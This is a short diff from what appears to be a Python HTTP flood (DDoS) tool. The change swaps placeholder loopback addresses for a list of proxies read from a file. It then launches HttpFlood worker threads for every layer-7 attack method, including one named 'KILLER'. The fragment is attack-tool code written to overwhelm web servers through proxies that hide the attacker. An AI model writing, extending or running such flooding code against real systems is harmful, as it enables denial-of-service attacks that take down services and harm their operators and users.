@@ -1705,9 +1705,10 @@ if __name__ == "__main__":
                 "KILLER",
             }
 
-            for i, method in enumerate(VALID_L7_METHODS):
-                ip_list = [f"127.10.{i}.{n}" for n in range(CONNS)]
+            with open(__dir__ / "files/proxies/http.txt", "r") as f:
+                ip_list = [line.rstrip("\n") for line in f.readlines()]
 
+            for method in VALID_L7_METHODS:
                 for thread_id in range(THREADS):
                     HttpFlood(
                         thread_id,
